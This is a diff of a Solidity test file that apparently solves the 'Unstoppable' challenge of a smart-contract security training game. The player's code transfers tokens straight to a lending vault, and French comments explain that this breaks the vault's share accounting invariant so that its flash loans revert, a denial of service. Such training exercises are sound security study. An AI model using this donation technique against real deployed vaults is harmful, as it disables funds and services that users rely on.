@@ -91,10 +91,10 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        // On “empoisonne” la vault en lui transférant des DVT directement,
-        // sans passer par deposit/mint, ce qui désaligne la comptabilité interne.
-        token.transfer(address(vault), 1e18); // 1 DVT
-        
+        // EXPLOIT : On envoie des tokens directement au vault sans passer par deposit()
+        // Ça casse l'invariant convertToShares == balanceOf car les shares ne sont pas mintées
+        // Résultat : flashLoan() va revert et le vault devient inutilisable (DOS)
+        token.transfer(address(vault), 1);
     }
 
     /**
